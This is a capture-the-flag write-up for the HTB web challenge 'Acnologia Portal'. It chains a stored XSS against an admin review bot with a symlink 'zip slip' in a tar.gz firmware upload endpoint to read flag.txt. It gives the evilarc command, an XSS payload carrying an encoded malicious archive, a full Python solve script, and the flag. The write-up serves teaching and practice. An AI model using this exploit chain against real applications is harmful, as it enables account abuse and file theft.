## 2022-05-15
#ctf-writeup

***

# Acnologia Portal
### Category: Web

## Description
Bonnie has confirmed the location of the Acnologia spacecraft operated by the Golden Fang mercenary. Before taking over the spaceship, we need to disable its security measures. Ulysses discovered an accessible firmware management portal for the spacecraft. Can you help him get in?

## Initial thoughts
For this challenge, we're given an endpoint to the "Acnologia Firmware Portal", which is just a login screen, as well as a zip file containing the source code. The code looks to be written using the Flask framework.

In `routes.py` we can see all the endpoints available to us. Many of the endpoints are publicly available, but some require you to be logged in, be an administrator, or some combination of the two.

I created an account, and after logging in was given a list of firmware and the ability to report a bug on each.

![[../Files/login.png]]
![[../Files/firmware-list.png]]

Looking at `routes.py` I could see that after posting a firmware report, a function `visit_report()` is called. This function launches a selenium driver in `bot.py` that visits the report review page using a bot with administrative credentials. This immediately indicates an XXS injection.

```python
# routes.py

@api.route('/firmware/report', methods=['POST'])
@login_required
def report_issue():
    if not request.is_json:
        return response('Missing required parameters!'), 401

    data = request.get_json()
    module_id = data.get('module_id', '')
    issue = data.get('issue', '')

    if not module_id or not issue:
        return response('Missing required parameters!'), 401

    new_report = Report(module_id=module_id, issue=issue, reported_by=current_user.username)
    db.session.add(new_report)
    db.session.commit()

    # highlight-start
    visit_report()
    # highlight-end
    migrate_db()

    return response('Issue reported successfully!')
```

If we look at the Jinja2 template for the review page, we confirm our XXS theory. The `{{ report.issue | safe }}` directive tells Jinja2 not to sanitize the value of `report.issue`. We can control the value of `report.issue` when we submit a report, allowing us to XXS the admin bot.

```python
# review.html

...
    <div class="container" style="margin-top: 20px"> {% for report in reports %} <div class="card">
        <div class="card-header"> Reported by : {{ report.reported_by }}
        </div>
        <div class="card-body">
        <p class="card-title">Module ID : {{ report.module_id }}</p>
          # highlight-start
          <p class="card-text">Issue : {{ report.issue | safe }} </p>
          # highlight-end
          <a href="#" class="btn btn-primary">Reply</a>
          <a href="#" class="btn btn-danger">Delete</a>
        </div>
      </div> {% endfor %} </div>
  </body>
</html>
```

Before crafting an XXS, I needed to know what we want the bot to do. Looking at the Dockerfile we see that `flag.txt` is copied to the root of the Linux instance, and somehow we need to read this file.

## Zip slip
One endpoint of interest is `/firmware/upload`, which requires admin access. It takes a file from a POST request and calls `extract_firmware()`.

```python
# routes.py

@api.route('/firmware/upload', methods=['POST'])
@login_required
@is_admin
def firmware_update():
    if 'file' not in request.files:
        return response('Missing required parameters!'), 401

    extraction = extract_firmware(request.files['file'])
    if extraction:
        return response('Firmware update initialized successfully.')

    return response('Something went wrong, please try again!'), 403
```

`extract_firmware()` does the following:
* Copies a tar.gz file to the `/tmp` directory.
* Extracts the tar.gz,
* Copies the extracted files to a randomly-generated directory in `static/firmware_extract`.

This sounds like a zip slip. Something interesting is that tar.gz files allow you to tar existing symlinks and have them maintain their link when untarred on a different system. If we tar a file that is symlinked to `/flag.txt`, we can zip slip this file into the static folder on the challenge instance (which is publically accessible) and then read it from there.

I used a tool called [evilarc](https://github.com/ptoomey3/evilarc) to generate the zip slip tar.gz file with the following command:

```shell
python2 evilarc.py -o unix -d 1 -f zip.tar.gz zip-dir/ -p app/application/static/firmware_extract
```

## The XXS
I took the base64 of this file and crafted an XXS injection to send a POST request using fetch. This will trick the bot into uploading this file.

I used the following XXS injection and submitted this as a firmware report.

```html
<script>
    const formData = new FormData();

    const base64str = "H4sICFWrgWIC/3ppcC50YXIA7dFBCsIwEIXhHCUnSNKkIceRUFqptFrSiHp700VBXGhREIT/g+EtZjbDU0rHaVpm6JuY+9NRz7lko7s+jZeY2l17zSk2WYtPmSJ4v2QVvHnMlahqWxtnvTdBGFvVzgnpxQ+cy7tJSnGIYzu/uHu3Xx9Z80+o7f3Pt/GL/kPY0r+z1pX+XTBeSKu7Ie5Vvmb6BwAAAAAAAAAAAAAAAIBnd4IsRacAKAAA";

    var binary = atob(base64str.replace(/\s/g, ''));
    var len = binary.length;
    var buffer = new ArrayBuffer(len);
    var view = new Uint8Array(buffer);
    for (var i = 0; i < len; i++) {
        view[i] = binary.charCodeAt(i);
    }

    var blob = new Blob( [view], { type: "application/gzip" });
    formData.append("file", blob, "zip.tar.gz");
    fetch("http://localhost:1337/api/firmware/upload", {credentials: "include", method: "POST", body: formData});
</script>
```

Once the bot visits the review page, it will use its admin credentials to upload our tar.gz file to the `/firmware/upload` endpoint. The Flask code will then attempt to un-tar the file, and our zip slip will put the symlink into `/app/application/static/firmware_extract` on the challenge filesystem.

We can then navigate to the endpoint `/static/firmware_extract/symlink` and `flag.txt` will be downloaded onto our computer.

## Final script
I wrote this Python 3 script that does all the steps.

```python
import requests

def main():
    endpoint = "http://127.0.0.1"
    port = "1337"

    requests.post(f"{endpoint}:{port}/api/register", json={"username": "Articuler", "password": "foobar"})
    login = requests.post(f"{endpoint}:{port}/api/login", json={"username": "Articuler", "password": "foobar"})

    cookies = {
        "session": login.cookies["session"],
        "nc_sameSiteCookiestrict": "true",
        "nc_sameSiteCookielax": "true"
    }

    xss = """<script>
    const formData = new FormData();

    const base64str = "H4sICFWrgWIC/3ppcC50YXIA7dFBCsIwEIXhHCUnSNKkIceRUFqptFrSiHp700VBXGhREIT/g+EtZjbDU0rHaVpm6JuY+9NRz7lko7s+jZeY2l17zSk2WYtPmSJ4v2QVvHnMlahqWxtnvTdBGFvVzgnpxQ+cy7tJSnGIYzu/uHu3Xx9Z80+o7f3Pt/GL/kPY0r+z1pX+XTBeSKu7Ie5Vvmb6BwAAAAAAAAAAAAAAAIBnd4IsRacAKAAA";

    var binary = atob(base64str.replace(/\s/g, ''));
    var len = binary.length;
    var buffer = new ArrayBuffer(len);
    var view = new Uint8Array(buffer);
    for (var i = 0; i < len; i++) {
        view[i] = binary.charCodeAt(i);
    }

    var blob = new Blob( [view], { type: "application/gzip" });
    formData.append("file", blob, "zip.tar.gz");
    fetch("http://localhost:1337/api/firmware/upload", {credentials: "include", method: "POST", body: formData});
    </script>"""

    json = {
        "module_id": "test",
        "issue": xss
    }

    r = requests.post(endpoint + ":" + port + "/api/firmware/report", cookies=cookies, json=json)
    print(r.text)

main()
```

## Flag
`HTB{des3r1aliz3_4ll_th3_th1ngs}`

***
